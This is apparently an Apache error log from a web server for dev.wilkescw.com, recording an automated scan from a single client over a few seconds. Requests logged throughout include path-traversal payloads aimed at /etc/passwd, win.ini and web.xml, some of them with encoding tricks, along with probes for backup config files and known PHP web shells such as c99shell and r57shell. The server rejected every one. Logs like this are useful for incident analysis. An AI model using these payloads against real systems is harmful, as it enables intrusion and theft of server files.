[Wed Jul 07 19:27:25.626912 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/old_logout.php' not found or unable to stat
[Wed Jul 07 19:27:25.630667 2021] [core:error] [pid 14467] [client 27.147.202.214:4319] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:25.646246 2021] [autoindex:error] [pid 14473] [client 27.147.202.214:4054] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://dev.wilkescw.com/images/
[Wed Jul 07 19:27:25.756980 2021] [core:error] [pid 14638] [client 27.147.202.214:4055] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:27:25.830368 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/old_config.php' not found or unable to stat
[Wed Jul 07 19:27:25.962536 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/logout_old.php' not found or unable to stat
[Wed Jul 07 19:27:25.996657 2021] [php7:error] [pid 14399] [client 27.147.202.214:4313] script '/var/www/html/dev.wilkescw.com/fonts/apc.php' not found or unable to stat
[Wed Jul 07 19:27:26.151642 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/config_old.php' not found or unable to stat
[Wed Jul 07 19:27:26.291658 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/logout_bak.php' not found or unable to stat
[Wed Jul 07 19:27:26.315726 2021] [autoindex:error] [pid 14375] [client 27.147.202.214:4321] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:26.399449 2021] [core:error] [pid 14359] [client 27.147.202.214:1300] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:27:26.468449 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/bak_config.php' not found or unable to stat
[Wed Jul 07 19:27:26.792066 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/config_bak.php' not found or unable to stat
[Wed Jul 07 19:27:26.868482 2021] [authz_core:error] [pid 14339] [client 27.147.202.214:1451] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/fonts/.htaccess
[Wed Jul 07 19:27:27.025622 2021] [php7:error] [pid 14399] [client 27.147.202.214:4313] script '/var/www/html/dev.wilkescw.com/helpBmxNs.php' not found or unable to stat
[Wed Jul 07 19:27:27.115356 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/backup_config.php' not found or unable to stat
[Wed Jul 07 19:27:27.436996 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/config_backup.php' not found or unable to stat
[Wed Jul 07 19:27:27.472320 2021] [php7:error] [pid 14460] [client 27.147.202.214:1302] script '/var/www/html/dev.wilkescw.com/admin/A5VphK1f.php' not found or unable to stat
[Wed Jul 07 19:27:27.806086 2021] [php7:error] [pid 14460] [client 27.147.202.214:1302] script '/var/www/html/dev.wilkescw.com/admin/db.php' not found or unable to stat
[Wed Jul 07 19:27:28.408557 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/8ZOFHhelp.php' not found or unable to stat
[Wed Jul 07 19:27:28.457043 2021] [php7:error] [pid 14425] [client 27.147.202.214:4310] script '/var/www/html/dev.wilkescw.com/admin/conf.php' not found or unable to stat
[Wed Jul 07 19:27:28.669737 2021] [php7:error] [pid 14339] [client 27.147.202.214:1451] script '/var/www/html/dev.wilkescw.com/coming_attractionsiioMi.php' not found or unable to stat
[Wed Jul 07 19:27:29.105073 2021] [php7:error] [pid 14465] [client 27.147.202.214:4311] script '/var/www/html/dev.wilkescw.com/admin/settings.php' not found or unable to stat
[Wed Jul 07 19:27:29.305524 2021] [php7:error] [pid 14339] [client 27.147.202.214:1451] script '/var/www/html/dev.wilkescw.com/AfCTNcoming_attractions.php' not found or unable to stat
[Wed Jul 07 19:27:29.435331 2021] [negotiation:error] [pid 14620] [client 27.147.202.214:5634] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/help (None could be negotiated).
[Wed Jul 07 19:27:29.768644 2021] [php7:error] [pid 14465] [client 27.147.202.214:4311] script '/var/www/html/dev.wilkescw.com/admin/config.php' not found or unable to stat
[Wed Jul 07 19:27:29.790577 2021] [negotiation:error] [pid 14620] [client 27.147.202.214:5634] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/coming_attractions (None could be negotiated).
[Wed Jul 07 19:27:30.197876 2021] [php7:error] [pid 14351] [client 27.147.202.214:4309] script '/var/www/html/dev.wilkescw.com/scheduleSk7FN.php' not found or unable to stat
[Wed Jul 07 19:27:30.356415 2021] [core:error] [pid 14147] [client 27.147.202.214:1443] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:27:30.416717 2021] [php7:error] [pid 13762] [client 27.147.202.214:4053] script '/var/www/html/dev.wilkescw.com/admin/config.inc.php' not found or unable to stat
[Wed Jul 07 19:27:30.550871 2021] [core:error] [pid 14487] [client 27.147.202.214:4312] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:30.843389 2021] [php7:error] [pid 14368] [client 27.147.202.214:4316] script '/var/www/html/dev.wilkescw.com/HExDYschedule.php' not found or unable to stat
[Wed Jul 07 19:27:30.861946 2021] [autoindex:error] [pid 14351] [client 27.147.202.214:4309] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:30.904377 2021] [negotiation:error] [pid 14379] [client 27.147.202.214:1557] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/schedule (None could be negotiated).
[Wed Jul 07 19:27:31.272117 2021] [php7:error] [pid 13762] [client 27.147.202.214:4053] script '/var/www/html/dev.wilkescw.com/admin/localconfig.php' not found or unable to stat
[Wed Jul 07 19:27:31.519048 2021] [core:error] [pid 14336] [client 27.147.202.214:13073] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:31.670155 2021] [core:error] [pid 14352] [client 27.147.202.214:13065] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:27:32.451929 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/old_help.php' not found or unable to stat
[Wed Jul 07 19:27:32.483803 2021] [authz_core:error] [pid 14427] [client 27.147.202.214:4308] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/admin/.htaccess
[Wed Jul 07 19:27:32.494669 2021] [php7:error] [pid 13762] [client 27.147.202.214:4053] script '/var/www/html/dev.wilkescw.com/admin/configuration.php' not found or unable to stat
[Wed Jul 07 19:27:32.773935 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/help_old.php' not found or unable to stat
[Wed Jul 07 19:27:32.854503 2021] [core:error] [pid 14149] [client 27.147.202.214:5636] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:27:33.099398 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/help_bak.php' not found or unable to stat
[Wed Jul 07 19:27:33.435326 2021] [autoindex:error] [pid 14356] [client 27.147.202.214:4064] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:33.525654 2021] [core:error] [pid 14345] [client 27.147.202.214:4314] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:27:33.635306 2021] [core:error] [pid 14384] [client 27.147.202.214:4063] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:33.719076 2021] [php7:error] [pid 13762] [client 27.147.202.214:4053] script '/var/www/html/dev.wilkescw.com/admin/settings.inc.php' not found or unable to stat
[Wed Jul 07 19:27:34.037243 2021] [php7:error] [pid 14351] [client 27.147.202.214:4309] script '/var/www/html/dev.wilkescw.com/old_coming_attractions.php' not found or unable to stat
[Wed Jul 07 19:27:34.052283 2021] [php7:error] [pid 13762] [client 27.147.202.214:4053] script '/var/www/html/dev.wilkescw.com/admin/global.inc.php' not found or unable to stat
[Wed Jul 07 19:27:34.358401 2021] [php7:error] [pid 14351] [client 27.147.202.214:4309] script '/var/www/html/dev.wilkescw.com/coming_attractions_old.php' not found or unable to stat
[Wed Jul 07 19:27:34.379360 2021] [php7:error] [pid 13762] [client 27.147.202.214:4053] script '/var/www/html/dev.wilkescw.com/admin/database.php' not found or unable to stat
[Wed Jul 07 19:27:34.691007 2021] [php7:error] [pid 14351] [client 27.147.202.214:4309] script '/var/www/html/dev.wilkescw.com/coming_attractions_bak.php' not found or unable to stat
[Wed Jul 07 19:27:34.836572 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/fonts/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:27:35.091507 2021] [authz_core:error] [pid 14399] [client 27.147.202.214:4313] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/.htaccess~
[Wed Jul 07 19:27:35.284135 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/r57shell.php' not found or unable to stat
[Wed Jul 07 19:27:35.341321 2021] [php7:error] [pid 14351] [client 27.147.202.214:4309] script '/var/www/html/dev.wilkescw.com/fonts/webadmin.php' not found or unable to stat
[Wed Jul 07 19:27:35.375284 2021] [authz_core:error] [pid 14352] [client 27.147.202.214:14022] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/_notes/.htaccess~
[Wed Jul 07 19:27:35.381786 2021] [php7:error] [pid 14375] [client 27.147.202.214:4321] script '/var/www/html/dev.wilkescw.com/old_schedule.php' not found or unable to stat
[Wed Jul 07 19:27:35.412099 2021] [authz_core:error] [pid 14399] [client 27.147.202.214:4313] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/.htaccess.old
[Wed Jul 07 19:27:35.493287 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/fonts/pi.php' not found or unable to stat
[Wed Jul 07 19:27:35.587359 2021] [php7:error] [pid 14465] [client 27.147.202.214:4311] script '/var/www/html/dev.wilkescw.com/admin/database.inc.php' not found or unable to stat
[Wed Jul 07 19:27:35.599160 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/r57.php' not found or unable to stat
[Wed Jul 07 19:27:35.703981 2021] [php7:error] [pid 14375] [client 27.147.202.214:4321] script '/var/www/html/dev.wilkescw.com/schedule_old.php' not found or unable to stat
[Wed Jul 07 19:27:35.739674 2021] [authz_core:error] [pid 14399] [client 27.147.202.214:4313] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/.htaccess.save
[Wed Jul 07 19:27:35.920863 2021] [core:error] [pid 14465] [client 27.147.202.214:4311] AH00126: Invalid URI in request GET /files/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:27:35.927390 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/r58.php' not found or unable to stat
[Wed Jul 07 19:27:36.021648 2021] [php7:error] [pid 14620] [client 27.147.202.214:5634] script '/var/www/html/dev.wilkescw.com/schedule_bak.php' not found or unable to stat
[Wed Jul 07 19:27:36.153465 2021] [php7:error] [pid 14392] [client 27.147.202.214:2879] script '/var/www/html/dev.wilkescw.com/fonts/php.php' not found or unable to stat
[Wed Jul 07 19:27:36.248884 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/c99shell.php' not found or unable to stat
[Wed Jul 07 19:27:36.343377 2021] [core:error] [pid 14336] [client 27.147.202.214:13116] AH00126: Invalid URI in request GET /icons//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:36.480228 2021] [php7:error] [pid 14620] [client 27.147.202.214:5634] script '/var/www/html/dev.wilkescw.com/fonts/i.php' not found or unable to stat
[Wed Jul 07 19:27:36.574666 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/c99.php' not found or unable to stat
[Wed Jul 07 19:27:36.642068 2021] [authz_core:error] [pid 14352] [client 27.147.202.214:14022] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/_notes/.htaccess.old
[Wed Jul 07 19:27:36.801559 2021] [php7:error] [pid 14453] [client 27.147.202.214:4008] script '/var/www/html/dev.wilkescw.com/fonts/test.php' not found or unable to stat
[Wed Jul 07 19:27:36.899647 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/nstview.php' not found or unable to stat
[Wed Jul 07 19:27:36.970802 2021] [authz_core:error] [pid 14352] [client 27.147.202.214:14022] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/_notes/.htaccess.save
[Wed Jul 07 19:27:37.115281 2021] [autoindex:error] [pid 14756] [client 27.147.202.214:7956] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:37.126065 2021] [php7:error] [pid 14453] [client 27.147.202.214:4008] script '/var/www/html/dev.wilkescw.com/fonts/temp.php' not found or unable to stat
[Wed Jul 07 19:27:37.225508 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/nst.php' not found or unable to stat
[Wed Jul 07 19:27:37.244672 2021] [php7:error] [pid 14715] [client 27.147.202.214:5982] script '/var/www/html/dev.wilkescw.com/files/x225atv16pgs.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:37.398227 2021] [php7:error] [pid 14458] [client 27.147.202.214:4057] script '/var/www/html/dev.wilkescw.com/config.inc.php' not found or unable to stat
[Wed Jul 07 19:27:37.446634 2021] [php7:error] [pid 14453] [client 27.147.202.214:4008] script '/var/www/html/dev.wilkescw.com/fonts/info.php' not found or unable to stat
[Wed Jul 07 19:27:37.552525 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/rst.php' not found or unable to stat
[Wed Jul 07 19:27:37.716935 2021] [php7:error] [pid 14457] [client 27.147.202.214:5991] script '/var/www/html/dev.wilkescw.com/localconfig.php' not found or unable to stat
[Wed Jul 07 19:27:37.766923 2021] [core:error] [pid 14413] [client 27.147.202.214:5978] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:37.878387 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/r57eng.php' not found or unable to stat
[Wed Jul 07 19:27:38.054795 2021] [core:error] [pid 14458] [client 27.147.202.214:4057] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:27:38.094301 2021] [core:error] [pid 14694] [client 27.147.202.214:5983] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:27:38.203469 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/shell.php' not found or unable to stat
[Wed Jul 07 19:27:38.222236 2021] [core:error] [pid 14467] [client 27.147.202.214:13076] AH00126: Invalid URI in request GET /icons//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:27:38.520541 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/dra.php' not found or unable to stat
[Wed Jul 07 19:27:38.702461 2021] [core:error] [pid 14147] [client 27.147.202.214:13150] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:27:38.847689 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/r.php' not found or unable to stat
[Wed Jul 07 19:27:39.170025 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/lol.php' not found or unable to stat
[Wed Jul 07 19:27:40.048084 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/zehir.php' not found or unable to stat
[Wed Jul 07 19:27:40.350043 2021] [php7:error] [pid 14457] [client 27.147.202.214:5991] script '/var/www/html/dev.wilkescw.com/configuration.php' not found or unable to stat
[Wed Jul 07 19:27:40.385187 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:27:40.508223 2021] [php7:error] [pid 14488] [client 27.147.202.214:5981] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/faculty.php
[Wed Jul 07 19:27:40.700518 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:40.850918 2021] [core:error] [pid 13762] [client 27.147.202.214:4053] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:27:40.984085 2021] [php7:error] [pid 14457] [client 27.147.202.214:5991] script '/var/www/html/dev.wilkescw.com/settings.inc.php' not found or unable to stat
[Wed Jul 07 19:27:41.018516 2021] [php7:error] [pid 14356] [client 27.147.202.214:4064] script '/var/www/html/dev.wilkescw.com/fonts/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:41.455329 2021] [core:error] [pid 14358] [client 27.147.202.214:5984] AH00126: Invalid URI in request GET /icons//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:27:41.697665 2021] [core:error] [pid 14391] [client 27.147.202.214:5977] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:41.785297 2021] [core:error] [pid 14465] [client 27.147.202.214:5976] AH00126: Invalid URI in request GET /icons//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:42.041646 2021] [php7:error] [pid 14457] [client 27.147.202.214:5991] script '/var/www/html/dev.wilkescw.com/global.inc.php' not found or unable to stat
[Wed Jul 07 19:27:42.255384 2021] [core:error] [pid 14345] [client 27.147.202.214:5979] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:42.324681 2021] [core:error] [pid 14458] [client 27.147.202.214:12375] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:42.348883 2021] [php7:error] [pid 14457] [client 27.147.202.214:5991] script '/var/www/html/dev.wilkescw.com/database.php' not found or unable to stat
[Wed Jul 07 19:27:42.871823 2021] [core:error] [pid 14369] [client 27.147.202.214:5986] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:43.008387 2021] [php7:error] [pid 14457] [client 27.147.202.214:5991] script '/var/www/html/dev.wilkescw.com/database.inc.php' not found or unable to stat
[Wed Jul 07 19:27:43.196888 2021] [core:error] [pid 14421] [client 27.147.202.214:13556] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Wed Jul 07 19:27:43.517890 2021] [core:error] [pid 14493] [client 27.147.202.214:5985] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Wed Jul 07 19:27:43.638302 2021] [core:error] [pid 14453] [client 27.147.202.214:4008] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:27:43.835266 2021] [core:error] [pid 14332] [client 27.147.202.214:13136] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:43.886782 2021] [core:error] [pid 14333] [client 27.147.202.214:12384] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:44.213313 2021] [core:error] [pid 14467] [client 27.147.202.214:12380] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:27:44.533948 2021] [core:error] [pid 14469] [client 27.147.202.214:7782] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:27:44.555624 2021] [core:error] [pid 14392] [client 27.147.202.214:2879] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:44.872470 2021] [core:error] [pid 14381] [client 27.147.202.214:5987] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:45.064886 2021] [php7:error] [pid 14370] [client 27.147.202.214:5974] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/
[Wed Jul 07 19:27:45.206865 2021] [core:error] [pid 14351] [client 27.147.202.214:4309] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:45.422691 2021] [php7:error] [pid 14473] [client 27.147.202.214:5990] script '/var/www/html/dev.wilkescw.com/files/apc.php' not found or unable to stat
